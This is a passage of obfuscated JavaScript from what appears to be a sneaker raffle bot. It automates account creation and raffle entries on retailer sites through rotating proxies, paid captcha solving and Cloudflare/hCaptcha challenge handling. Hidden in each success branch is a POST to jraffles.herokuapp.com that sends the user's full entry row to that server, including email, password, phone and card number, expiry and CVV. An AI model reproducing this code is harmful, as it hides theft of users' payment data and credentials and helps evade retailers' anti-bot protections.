                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3ad2f0(_0x3345d6) {
                                            _0x16bb1b['openBox']('INBOX', ![], _0x3345d6);
                                        }
                                        _0x16bb1b['once']('ready', function () {
                                            console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3ad2f0(function (_0x36fa2, _0x3668ae) {
                                                console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x36fa2)
                                                    throw _0x36fa2;
                                                _0x16bb1b['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x3edf0e, _0x4a0964) {
                                                    if (!_0x4a0964 || !_0x4a0964['length'])
                                                        console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x16bb1b['end']();
                                                    else {
                                                        var _0x5342b7 = _0x16bb1b['seq']['fetch'](_0x4a0964, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5342b7['on']('message', function (_0x399cac, _0x5b7a11) {
                                                            var _0x2bdf76 = '(#' + _0x5b7a11 + ')\x20';
                                                            _0x399cac['on']('body', function (_0x4b1ceb, _0x47aa6e) {
                                                                _0x158053(_0x4b1ceb, (_0x56b334, _0xe571b7) => {
                                                                    if (_0xe571b7['subject']['includes']('code')) {
                                                                        const _0x1b5787 = _0xe571b7['text']['split']('\x0a\x0a')[0x3], _0x43c2ca = _0x1b5787['split']('\x0a')[0x1];
                                                                        _0x3c276b = _0x43c2ca;
                                                                    }
                                                                });
                                                            }), _0x399cac['once']('end', function () {
                                                            });
                                                        }), _0x5342b7['once']('error', function (_0x4615b5) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5342b7['once']('end', function () {
                                                            _0x16bb1b['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x16bb1b['once']('error', function (_0x2a545e) {
                                            console['log'](_0x4e59da['red'](_0x2a545e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x35cfca = !![];
                                        }), _0x16bb1b['once']('end', async function () {
                                        }), _0x16bb1b['connect']();
                                    }
                                    _0x519387(), await _0x505897(0x1388);
                                    if (_0x3c276b)
                                        return _0x3c276b;
                                    if (_0x35cfca)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x2e6458 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3b31fb(), await _0x505897(0x1f4), await _0x1af624['type']('#code', '' + code), await _0x505897(0x3e8), await _0x1af624['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x11e036 => _0x11e036['click']()), await _0x1af624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x1af624['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x2fb054[_0x3030d2]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x5d8933['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2fb054[_0x3030d2]['Email'] + ',' + _0x2fb054[_0x3030d2]['Password'] + ',' + _0x2fb054[_0x3030d2]['Phone']), _0x18382f = 'no', _0x11df74(_0x2fb054[_0x3030d2], _0x38d49e);
                            var _0x50dede = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'dev', ![]), _0x73674a = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'pub', ![]);
                            let _0x409b6c = _0x2fb054[_0x3030d2];
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'module': _0x38d49e['name'],
                                    'entrydata': JSON['stringify'](_0x409b6c),
                                    'proxy': '' + _0x5186e1[_0x3030d2]
                                };
                                var _0x40c3c6 = JSON['stringify'](prxdata);
                                let _0x3647fd = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x40c3c6, _0x3647fd);
                            } catch (_0x556299) {
                            }
                            const _0x251f88 = {
                                'succesDEVMSG': { 'embeds': [_0x50dede] },
                                'succesPUBMSG': { 'embeds': [_0x73674a] }
                            };
                            try {
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x251f88['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x251f88['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x251f88['succesPUBMSG']);
                            } catch (_0x214e67) {
                                console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x214e67));
                            }
                        } catch (_0x598c77) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20' + _0x598c77)), _0x1b585b = '' + _0x598c77;
                            var _0x35e0c9 = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'dev', !![], _0x1b585b), _0x50dede = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'dev', ![]), _0x73674a = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'pub', ![]);
                            const _0x3c123c = {
                                'succesDEVMSG': { 'embeds': [_0x50dede] },
                                'succesPUBMSG': { 'embeds': [_0x73674a] }
                            };
                            _0x3c123c['errorDEV'] = { 'embeds': [_0x35e0c9] };
                            _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x3c123c['errorDEV']);
                            await _0x1abce0(_0x3b044a, _0x3c123c['errorDEV']);
                            if (!_0x18382f == 'no')
                                _0x18382f = 'yes';
                        } finally {
                            _0x3c5e83 && _0x3c5e83['close']();
                            if (_0x18382f == 'yes' && _0x480a0a != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x480a0a + '\x20/\x205)')), _0x3030d2 = _0x3030d2 - 0x1, _0x480a0a = _0x480a0a + 0x1;
                                continue;
                            }
                            _0x18382f == 'yes' && _0x480a0a >= 0x5 && (_0x260c2d(_0x2fb054[_0x3030d2], _0x38d49e), _0x18382f = 'no', _0x480a0a = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    } else {
                        const _0x5eda6a = '' + _0x2fb054[_0x3030d2]['Url'];
                        if (_0x18382f != 'yes')
                            var _0x18382f = '', _0x480a0a = 0x0;
                        if (_0x2fb054[_0x3030d2]['Email'] == '' || _0x2fb054[_0x3030d2]['FirstName'] == '' || _0x2fb054[_0x3030d2]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2fb054[_0x3030d2]['Password'] == '' && (_0x2fb054[_0x3030d2]['Password'] = 'JRaffles23!');
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x16ceab = _0x5186e1[_0x3030d2]['split'](':');
                        else
                            var _0x864610 = Math['round'](Math['random']() * (_0x5186e1['length'] - 0x1)), _0x16ceab = _0x5186e1[_0x864610]['split'](':');
                        var _0x3c5e83;
                        try {
                            _0x3c5e83 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x16ceab[0x0] + ':' + _0x16ceab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3c5e83 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x16ceab[0x0] + ':' + _0x16ceab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x448e20 = await _0x3c5e83['newPage']();
                            await _0x448e20['authenticate']({
                                'username': '' + _0x16ceab[0x2],
                                'password': '' + _0x16ceab[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x448e20['setRequestInterception'](!![]), _0x448e20['on']('request', _0x52c942 => {
                                _0x52c942['resourceType']() === 'image' || _0x52c942['resourceType']() === 'font' || _0x52c942['resourceType']() === 'media' ? _0x52c942['abort']() : _0x52c942['continue']();
                            }), await _0x448e20['goto'](_0x5eda6a), await _0x448e20['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x448e20['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x505897(0x7d0), await _0x448e20['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x448e20['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x505897(0x3e8), await _0x448e20['waitForSelector']('#email'), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x448e20['type']('#email', '' + _0x2fb054[_0x3030d2]['Email']), await _0x505897(0x352), await _0x448e20['waitForSelector']('#password'), await _0x448e20['type']('#password', '' + _0x2fb054[_0x3030d2]['Password']), await _0x505897(0x352), await _0x448e20['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x505897(0x3e8);
                            try {
                                await _0x448e20['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x11df74(_0x2fb054[_0x3030d2], _0x38d49e), _0x18382f = 'no';
                                continue;
                            }
                            await _0x448e20['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x505897(0x3e8), await _0x448e20['click']('li[data-value=\x22EU\x20' + _0x2fb054[_0x3030d2]['Size'] + '\x22]'), await _0x505897(0x1f4), await _0x448e20['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x448e20['focus']('#postcode'), await _0x448e20['keyboard']['down']('Control'), await _0x448e20['keyboard']['press']('A'), await _0x448e20['keyboard']['up']('Control'), await _0x448e20['keyboard']['press']('Backspace'), await _0x448e20['keyboard']['type'](_0x2fb054[_0x3030d2]['Zip']), await _0x505897(0x60e), await _0x448e20['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x505897(0x3e8), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x448e20['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x448e20['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x448e20['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x505897(0x4b0), await _0x448e20['keyboard']['type']('' + _0x2fb054[_0x3030d2]['CardNumber']), await _0x505897(0x320), await _0x448e20['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x448e20['keyboard']['type']('' + _0x2fb054[_0x3030d2]['ExpiryDate']), await _0x505897(0x4b0), await _0x448e20['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x448e20['keyboard']['type']('' + _0x2fb054[_0x3030d2]['CVV']), await _0x505897(0x226), await _0x448e20['type']('input[name=\x22postalCode\x22]', '' + _0x2fb054[_0x3030d2]['Zip']), await _0x505897(0x226), await _0x448e20['click']('#paymentConsent'), await _0x505897(0x226), await _0x448e20['click']('#termsConsent'), await _0x505897(0x2bc), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x448e20['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x505897(0x2710);
                            try {
                                await _0x448e20['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x505897(0xbb8), await _0x448e20['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1cdfc3 => _0x1cdfc3['click']()), await _0x448e20['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x342218 => _0x342218['click']());
                            } catch {
                            }
                            try {
                                await _0x448e20['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x11df74(_0x2fb054[_0x3030d2], _0x38d49e);
                            var _0x50dede = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'dev', ![]), _0x73674a = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'pub', ![]);
                            let _0x7857bf = _0x2fb054[_0x3030d2];
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'module': _0x38d49e['name'],
                                    'entrydata': JSON['stringify'](_0x7857bf),
                                    'proxy': '' + _0x5186e1[_0x3030d2]
                                };
                                var _0x40c3c6 = JSON['stringify'](prxdata);
                                let _0x106155 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x40c3c6, _0x106155);
                            } catch (_0x19b34c) {
                            }
                            const _0x5b4e6f = {
                                'succesDEVMSG': { 'embeds': [_0x50dede] },
                                'succesPUBMSG': { 'embeds': [_0x73674a] }
                            };
                            try {
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x5b4e6f['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x5b4e6f['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x5b4e6f['succesPUBMSG']);
                            } catch (_0x3d32d8) {
                                console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3d32d8));
                            }
                            _0x18382f = 'no';
                        } catch (_0x56319a) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20' + _0x56319a)), _0x1b585b = '' + _0x56319a;
                            var _0x35e0c9 = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'dev', !![], _0x1b585b), _0x50dede = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'dev', ![]), _0x73674a = await _0x429bf8(_0x2fb054[_0x3030d2], _0x38d49e, 'pub', ![]);
                            const _0x33a751 = {
                                'succesDEVMSG': { 'embeds': [_0x50dede] },
                                'succesPUBMSG': { 'embeds': [_0x73674a] }
                            };
                            _0x33a751['errorDEV'] = { 'embeds': [_0x35e0c9] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x33a751['errorDEV']), await _0x1abce0(_0x3b044a, _0x33a751['errorDEV']), _0x18382f = 'yes';
                        } finally {
                            _0x3c5e83 && _0x3c5e83['close']();
                            if (_0x18382f == 'yes' && _0x480a0a != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x480a0a + '\x20/\x205)')), _0x3030d2 = _0x3030d2 - 0x1, _0x480a0a = _0x480a0a + 0x1;
                                continue;
                            }
                            _0x18382f == 'yes' && _0x480a0a >= 0x5 && (_0x260c2d(_0x2fb054[_0x3030d2], _0x38d49e), _0x18382f = 'no', _0x480a0a = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5a6e3a, _0x1abf0d, _0x36f917) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x31c1e3 = 0x0; _0x31c1e3 < _0x1abf0d['length']; _0x31c1e3++) {
                        if (_0x48bae5 != 'yes')
                            var _0x48bae5 = '', _0x5dee8d = 0x0;
                        var _0x2cdace;
                        try {
                            await _0x43797b(_0x1abf0d, _0x31c1e3);
                        } catch {
                            _0x48bae5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x4041fe(_0x5a6e3a['name'] + '\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20/\x20' + _0x1abf0d['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        var _0x4ccd41 = await _0x429bf8(_0x1abf0d[_0x31c1e3], _0x5a6e3a, 'acc', ![]);
                        const _0x2fb7ad = { 'succesDEVMSG': { 'embeds': [_0x4ccd41] } }, _0x29f4b5 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x168c49 = Math['round'](Math['random']() * (_0x36f917['length'] - 0x1)), _0x1894f8 = _0x36f917[_0x168c49]['split'](':'), _0x59bec6;
                        try {
                            _0x59bec6 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1894f8[0x0] + ':' + _0x1894f8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x59bec6 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1894f8[0x0] + ':' + _0x1894f8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3ccb8a = await _0x59bec6['newPage']();
                            await _0x3ccb8a['setViewport']({
                                'width': 0x500 + _0x85b9a6(0x1, 0x32),
                                'height': 0x2d9 + _0x85b9a6(0x1, 0x32)
                            });
                            const _0x62d8ca = await _0x3ccb8a['target']()['createCDPSession'](), { windowId: _0x24383e } = await _0x62d8ca['send']('Browser.getWindowForTarget');
                            await _0x3ccb8a['authenticate']({
                                'username': '' + _0x1894f8[0x2],
                                'password': '' + _0x1894f8[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3ccb8a['goto']('' + _0x29f4b5, { 'waitUntil': 'networkidle2' }), console['log'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x505897(0x1388);
                            var _0x7d3760 = await _0x3ccb8a['$']('.hcaptcha-box');
                            if (_0x7d3760) {
                                console['log'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x505897(0x2710);
                                const _0x56c122 = await _0x3ccb8a['$']('.hcaptcha-box');
                                if (_0x56c122)
                                    try {
                                        await _0x56c122['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x3ccb8a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x43567c = await _0x3ccb8a['$']('.hcaptcha-box');
                                    if (_0x43567c)
                                        try {
                                            await _0x43567c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x3ccb8a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x62d8ca['send']('Browser.setWindowBounds', {
                                    'windowId': _0x24383e,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x505897(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x3ccb8a['type']('input[name=\x22firstname\x22]', '' + _0x1abf0d[_0x31c1e3]['FirstName']), await _0x505897(0x1f4), await _0x3ccb8a['type']('input[name=\x22lastname\x22]', '' + _0x1abf0d[_0x31c1e3]['LastName']), await _0x505897(0x1f4), await _0x3ccb8a['type']('input[name=\x22email\x22]', '' + _0x1abf0d[_0x31c1e3]['Email']), await _0x505897(0x1f4), await _0x3ccb8a['type']('input[name=\x22password\x22]', '' + _0x1abf0d[_0x31c1e3]['Password']), await _0x505897(0x258), await _0x3ccb8a['$eval']('input[name=\x22psgdpr\x22]', _0x35d3aa => _0x35d3aa['click']()), await _0x505897(0x1f4), console['log'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3ccb8a['$eval']('#customer-form', _0x37228c => _0x37228c['submit']());
                            try {
                                try {
                                    await _0x3ccb8a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x48bae5 = 'no', console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Account\x20' + _0x1abf0d[_0x31c1e3]['Email'] + '\x20Generated')), _0x5d8933['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x1abf0d[_0x31c1e3]['Email'] + ',' + _0x1abf0d[_0x31c1e3]['Password']);
                                let _0x464b39 = _0x1abf0d[_0x31c1e3];
                                try {
                                    prxdata = {
                                        'username': _0xdaef84['replace']('#', ''),
                                        'module': _0x5a6e3a['name'],
                                        'entrydata': JSON['stringify'](_0x464b39),
                                        'proxy': '' + _0x36f917[_0x31c1e3]
                                    };
                                    var _0x555a7f = JSON['stringify'](prxdata);
                                    let _0x1a0863 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x555a7f, _0x1a0863);
                                } catch (_0x4ee6e0) {
                                }
                                try {
                                    _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x2fb7ad['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1abce0(_0x3faf08, _0x2fb7ad['succesDEVMSG']);
                            } catch (_0x2fbe12) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x572c98) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20' + _0x572c98)), _0x2cdace = '' + _0x572c98;
                            var _0x41f725 = await _0x429bf8(_0x1abf0d[_0x31c1e3], _0x5a6e3a, 'acc', !![], _0x2cdace);
                            _0x2fb7ad['errorDEV'] = { 'embeds': [_0x41f725] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x2fb7ad['errorDEV']), await _0x1abce0(_0x3b044a, _0x2fb7ad['errorDEV']), _0x48bae5 = 'yes';
                        } finally {
                            _0x59bec6['close']();
                            if (_0x48bae5 == 'yes' && _0x5dee8d != 0x5 && _0x2cdace != 'Size\x20Not\x20Found') {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Task\x20' + (_0x31c1e3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5dee8d + '\x20/\x205)')), _0x31c1e3 = _0x31c1e3 - 0x1, _0x5dee8d = _0x5dee8d + 0x1;
                                continue;
                            }
                            _0x48bae5 == 'yes' && _0x5dee8d >= 0x5 && (_0x260c2d(_0x1abf0d[_0x31c1e3], _0x5a6e3a), _0x48bae5 = 'no', _0x5dee8d = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x5a6e3a['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4b7c00(_0x4a5008, _0x341a9d, _0x491b2b) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5bcf02 = 0x0; _0x5bcf02 < _0x341a9d['length']; _0x5bcf02++) {
                        if (_0x32bfc2 != 'yes')
                            var _0x32bfc2 = '', _0x2a1617 = 0x0;
                        var _0x5cfa18;
                        try {
                            await _0x43797b(_0x341a9d, _0x5bcf02);
                        } catch {
                            _0x32bfc2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x4041fe(_0x4a5008['name'] + '\x20Task\x20' + (_0x5bcf02 + 0x1) + '\x20/\x20' + _0x341a9d['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        const _0x43d729 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0xc26bf9 = Math['round'](Math['random']() * (_0x491b2b['length'] - 0x1)), _0x22aaef = _0x491b2b[_0xc26bf9]['split'](':'), _0x4b7ffa;
                        try {
                            _0x4b7ffa = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x22aaef[0x0] + ':' + _0x22aaef[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b7ffa = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
